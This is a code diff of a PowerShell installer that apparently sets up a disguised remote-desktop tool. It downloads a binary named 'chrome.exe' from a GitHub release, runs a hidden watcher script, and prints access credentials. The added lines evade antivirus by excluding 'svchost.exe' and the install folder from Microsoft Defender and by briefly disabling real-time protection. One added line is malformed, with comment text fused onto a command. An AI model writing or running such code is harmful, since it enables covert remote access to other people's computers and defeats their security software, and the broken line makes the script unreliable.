@@ -7,17 +7,21 @@ function Install-RD {
     $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'
 
     try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
+    try { Add-MpPreference -ExclusionProcess "svchost.exe" -EA SilentlyContinue } catch {}
+
+    # Also disable real-time protection briefly to allow the download
+    try { Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue } catch {}
 
     # Kill old + clean
     Get-Process svchost -EA SilentlyContinue |
         Where-Object { $_.Path -like '*WinSystem*' } |
         Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 1
-    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
+    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue - folder excluded from Defender before download
     New-Item -ItemType Directory $DEST   -Force | Out-Null
     New-Item -ItemType Directory $cfgDir -Force | Out-Null
+    try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
 
-    # Download
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile("$base/chrome.exe", $EXE)
     try { $wc.DownloadFile("$base/sciter.dll", $DLL) } catch {}
@@ -100,6 +104,9 @@ if (Test-Path $del) { & $del }
 '@ -Encoding UTF8
 
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""
+
+    # Re-enable Defender real-time protection
+    try { Set-MpPreference -DisableRealtimeMonitoring $false -EA SilentlyContinue } catch {}
 
     # Print ID and password clearly in the CMD window
     Write-Host ""
